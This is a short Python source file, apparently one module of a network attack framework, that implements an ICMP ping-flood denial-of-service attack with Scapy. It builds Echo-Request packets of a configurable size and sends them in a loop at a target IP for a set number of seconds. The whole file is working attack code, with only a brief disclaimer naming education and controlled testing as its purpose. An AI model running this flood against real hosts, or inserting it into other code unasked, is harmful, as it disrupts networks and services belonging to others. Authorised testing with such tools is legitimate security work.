"""
ICMPFlood.py

Implements an ICMP Flood (Ping-Flood) attack.

Parameter summary
+---------------+-------+---------------------------------------------+
| parameter     | type  | default / purpose                           |
+---------------+-------+---------------------------------------------+
| duration      | int   | 10   - attack runtime in seconds            |
| payload_size  | int   | 56   - bytes in the ICMP Echo payload       |
+---------------+-------+---------------------------------------------+

DISCLAIMER:
This tool is designed strictly for educational purposes and controlled network security testing.
"""

import time
from scapy.all import IP, ICMP, Raw, send

from attacks.attack import Attack

class ICMPFlood(Attack):
    """Continuously sends ICMP Echo-Request packets for *duration* seconds."""

    # ------------------------------------------------------------------ #
    def execute(self) -> None:
        self.wait_until_start()

        duration      = int(self.parameters.get("duration", 10))
        payload_size  = int(self.parameters.get("payload_size", 56))

        self._icmp_flood(self.target_ip, duration, payload_size)

    # ------------------------------------------------------------------ #
    @staticmethod
    def _icmp_flood(target_ip: str,duration: int,payload_size: int) -> None:
        """Send ICMP Echo-Request packets for *duration* seconds."""
        
        pkt  = IP(dst=target_ip) / ICMP() / Raw(bytes(payload_size))
        stop = time.time() + duration

        # Scapy's send() chooses the correct interface automatically.
        while time.time() < stop:
            send(pkt, verbose=0)
